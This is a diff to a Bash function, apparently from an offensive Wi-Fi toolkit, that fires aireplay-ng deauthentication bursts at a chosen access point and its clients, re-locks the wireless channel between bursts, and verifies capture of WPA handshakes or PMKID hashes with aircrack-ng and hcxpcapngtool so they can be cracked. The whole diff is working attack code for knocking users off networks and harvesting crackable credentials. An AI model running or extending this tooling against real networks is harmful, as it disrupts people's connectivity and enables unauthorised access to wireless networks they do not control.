@@ -106,7 +106,7 @@ run_wifi_recon() {
         fi
     done < "$csv_file"
 
-    echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// ISOLATED WIRELESS TARGET MATRIX ]${TXT_VOID}───────────────────────────────────╢${NC}"
+    echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// ISOLATED WIRELESS TARGET MATRIX ]${TXT_VOID}───────────────────────────────────⢢${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}NUM  BSSID              CH   PWR   STAs  ENC      ESSID${NC}"
     echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────⢢${NC}"
 
@@ -252,6 +252,9 @@ run_wifi_recon() {
         else
             aireplay-ng -0 10 -a "$sel_bssid" "$iface" >/dev/null 2>&1
         fi
+        # Принудительная рефиксация канала после 1-го залпа (фикс сброса на ноутбуках)
+        iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1
+
         sleep 2
         echo -e "${TXT_VOID}║${NC}   ${TXT_RED_ALARM}[ * ] FIRING DEAUTH IMPULSES VIA AIREPLAY-NG (BURST 2/2)...${NC}"
         if [ -n "$deauth_target" ]; then
@@ -259,6 +262,9 @@ run_wifi_recon() {
         else
             aireplay-ng -0 10 -a "$sel_bssid" "$iface" >/dev/null 2>&1
         fi
+        # Принудительная рефиксация канала после 2-го залпа
+        iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1
+
         echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ + ] Injection cycle complete. Awaiting handshake catch...${NC}"
     fi
 
@@ -273,12 +279,24 @@ run_wifi_recon() {
 
     local final_cap="${capture_out}-01.cap"
     local verify_hash="/tmp/check_valid_${current_pid}.hc22000"
+    local handshake_found=false
 
-    if command -v hcxpcapngtool >/dev/null 2>&1 && [ -f "$final_cap" ]; then
-        hcxpcapngtool -o "$verify_hash" "$final_cap" >/dev/null 2>&1
+    # Метод 1: Проверка через aircrack-ng (гарантированно ловит WPA хендшейки в .cap)
+    if command -v aircrack-ng >/dev/null 2>&1 && [ -f "$final_cap" ]; then
+        if aircrack-ng -b "$sel_bssid" "$final_cap" 2>/dev/null | grep -qi "handshake"; then
+            handshake_found=true
+        fi
     fi
 
-    if [ -f "$verify_hash" ] && [ -s "$verify_hash" ]; then
+    # Метод 2: Проверка/конвертация через hcxpcapngtool
+    if command -v hcxpcapngtool >/dev/null 2>&1 && [ -f "$final_cap" ]; then
+        hcxpcapngtool -o "$verify_hash" "$final_cap" >/dev/null 2>&1
+        if [ -f "$verify_hash" ] && [ -s "$verify_hash" ]; then
+            handshake_found=true
+        fi
+    fi
+
+    if [ "$handshake_found" = true ]; then
         echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] VALIDATION PASSED: EAPOL Handshake / PMKID Hash Extracted!${NC}"
         echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] SUCCESS: CAPTURE ARTIFACT CREATED:${NC} ${TXT_RED_SUPERNOVA}${final_cap}${NC}"
         echo -e "${TXT_VOID}║   ${TXT_RED_PLASMA}Ready for decryption via options -W / -c${NC}"
